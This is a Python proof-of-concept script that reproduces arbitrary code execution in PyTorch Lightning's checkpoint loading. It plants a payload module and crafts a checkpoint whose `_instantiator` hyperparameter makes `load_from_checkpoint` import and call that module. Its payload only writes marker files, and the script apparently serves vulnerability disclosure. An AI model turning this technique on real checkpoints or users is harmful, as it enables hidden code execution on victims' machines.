#!/usr/bin/env python3
"""Reproduce arbitrary code execution through `_instantiator` in Lightning checkpoints."""

from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

import torch


ROOT = Path(__file__).resolve().parent
CODEBASE_SRC = ROOT / "codebase" / "src"
if str(CODEBASE_SRC) not in sys.path:
    sys.path.insert(0, str(CODEBASE_SRC))

from lightning.pytorch.core.module import LightningModule  # noqa: E402


class Victim(LightningModule):
    def __init__(self) -> None:
        super().__init__()
        self.layer = torch.nn.Linear(1, 1)

    def forward(self, x: torch.Tensor) -> torch.Tensor:
        return self.layer(x)


def build_payload_package(workdir: Path) -> None:
    """Create a module whose import and call both leave filesystem markers."""
    pkg_dir = workdir / "payloadpkg"
    pkg_dir.mkdir()
    imported_marker = workdir / "imported.txt"
    called_marker = workdir / "called.txt"
    init_py = f"""from pathlib import Path
Path({str(imported_marker)!r}).write_text("imported")


def payload(cls, kwargs):
    Path({str(called_marker)!r}).write_text("called")
    return cls(**kwargs)
"""
    (pkg_dir / "__init__.py").write_text(init_py)


def main() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        workdir = Path(tmp)
        os.chdir(workdir)
        sys.path.insert(0, str(workdir))
        build_payload_package(workdir)

        victim = Victim()
        checkpoint_path = workdir / "evil.ckpt"
        checkpoint = {
            "state_dict": victim.state_dict(),
            "hyper_parameters": {"_instantiator": "payloadpkg.payload"},
            "pytorch-lightning_version": "2.6.2",
        }
        torch.save(checkpoint, checkpoint_path)

        safe_checkpoint = torch.load(checkpoint_path, weights_only=True)
        print("weights_only_keys", sorted(safe_checkpoint.keys()))
        print("weights_only_instantiator", safe_checkpoint["hyper_parameters"]["_instantiator"])

        loaded = Victim.load_from_checkpoint(checkpoint_path)
        print("loaded_class", loaded.__class__.__name__)
        print("import_marker", (workdir / "imported.txt").read_text())
        print("call_marker", (workdir / "called.txt").read_text())
        print("reproducible", True)


if __name__ == "__main__":
    main()
